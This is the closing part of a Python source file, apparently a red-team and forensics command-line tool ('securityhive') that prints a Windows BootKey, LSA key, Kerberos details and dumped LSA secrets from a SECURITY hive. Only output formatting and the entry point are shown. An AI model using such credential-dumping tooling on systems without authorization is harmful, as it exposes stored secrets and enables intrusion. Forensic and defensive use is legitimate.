                        "realm": eff_realm,
                        "hostname": eff_hostname,
                        "dns_domain": eff_dns_domain,
                        "secrets": [asdict(s) for s in secrets],
                    }
                ),
                indent=2,
            )
        )
        return

    ct = conf.color_theme
    print(f"BootKey : {ct.cyan(boot_key.hex())}")
    if lsa_key:
        print(f"LSA Key : {ct.cyan(lsa_key.hex())}")
    if eff_realm or eff_hostname:
        print(
            f"Kerberos: realm={ct.cyan(eff_realm or '?')}  "
            f"host={ct.cyan(eff_hostname or '?')}  "
            f"dns={ct.cyan(eff_dns_domain or '?')}"
        )
    print()
    _print_lsa_secrets(secrets)


def main():
    """
    Main entry point
    """
    from scapy.utils import AutoArgparse

    conf.exts.load("scapy-red")
    AutoArgparse(securityhive)


# For autocompletion generation
AUTOCOMPLETE_GEN = securityhive

if __name__ == "__main__":
    main()
